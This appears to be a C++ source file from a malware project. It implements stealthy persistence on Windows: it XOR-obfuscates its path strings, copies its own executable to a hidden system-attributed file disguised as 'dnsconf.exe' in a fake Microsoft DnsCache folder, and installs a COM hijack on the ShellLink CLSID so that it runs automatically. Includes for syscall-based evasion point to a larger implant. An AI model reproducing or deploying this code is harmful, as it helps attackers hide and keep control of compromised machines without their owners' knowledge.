#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

namespace persistence {

namespace {
    const wchar_t kClsidEnc[] = { '{'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '2'^0x4B, '1'^0x1F, '4'^0x8C, '0'^0x3E, '1'^0x4B, '-'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '-'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '-'^0x3E, 'C'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '-'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '0'^0x3E, '0'^0x4B, '0'^0x1F, '0'^0x8C, '4'^0x3E, '6'^0x4B, '}'^0x1F }; // {00021401-0000-0000-C000-000000000046}
    const wchar_t kSubDirEnc[] = { 'M'^0x4B, 'i'^0x1F, 'c'^0x8C, 'r'^0x3E, 'o'^0x4B, 's'^0x1F, 'o'^0x8C, 'f'^0x3E, 't'^0x4B, '\\'^0x1F, 'W'^0x8C, 'i'^0x3E, 'n'^0x4B, 'd'^0x1F, 'o'^0x8C, 'w'^0x3E, 's'^0x4B, '\\'^0x1F, 'D'^0x8C, 'n'^0x3E, 's'^0x4B, 'C'^0x1F, 'a'^0x8C, 'c'^0x3E, 'h'^0x4B, 'e'^0x1F }; // Microsoft\Windows\DnsCache
    const wchar_t kExeNameEnc[] = { 'd'^0x4B, 'n'^0x1F, 's'^0x8C, 'c'^0x3E, 'o'^0x4B, 'n'^0x1F, 'f'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // dnsconf.exe

    std::wstring GetPersistencePath() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, 26) + L"\\" + utils::DecryptW(kExeNameEnc, 11);
        }
        return L"";
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing stealthy persistence...");

    std::wstring targetPath = GetPersistencePath();
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) return L"";
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (_wcsicmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));

        // Create directories recursively if needed
        size_t pos = 0;
        while ((pos = dir.find(L"\\", pos + 1)) != std::wstring::npos) {
            std::wstring sub = dir.substr(0, pos);
            CreateDirectoryW(sub.c_str(), NULL);
        }
        CreateDirectoryW(dir.c_str(), NULL);

        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
            // Try an alternative path if the primary one fails
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    std::wstring clsid = utils::DecryptW(kClsidEnc, 38);
    if (ComHijacker::Install(targetPath, clsid)) {
        LOG_INFO("COM Hijack success: " + utils::ws2s(clsid));
        return targetPath;
    }

    return L"";
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
